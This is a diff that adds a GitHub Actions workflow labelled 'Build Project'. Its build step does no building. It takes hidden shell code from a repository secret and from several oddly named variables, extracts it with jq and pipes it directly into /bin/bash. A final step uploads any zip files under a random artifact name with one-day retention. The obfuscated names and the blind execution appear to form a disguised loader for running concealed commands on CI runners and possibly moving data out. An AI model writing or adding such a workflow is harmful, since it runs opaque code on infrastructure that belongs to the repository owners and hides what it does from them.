@@ -1,0 +1,40 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          w08546: ${{ secrets.w08546 }}
+        run: |
+          printf '%s' "$w08546" | jq -r .oqzpc0 | /bin/bash
+          printf '%s' "$bt04212" | jq -r .vv2375 | /bin/bash
+          printf '%s' "$zt66" | jq -r .uvi20277 | /bin/bash
+          printf '%s' "$kvq12" | jq -r .m96878 | /bin/bash
+          echo $okkdu9728 | jq -r .fh29 | /bin/bash
+          echo $urk42325 | jq -r .hrqx23729 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Lgz0INNH
+          path: "*.zip"
+          retention-days: 1
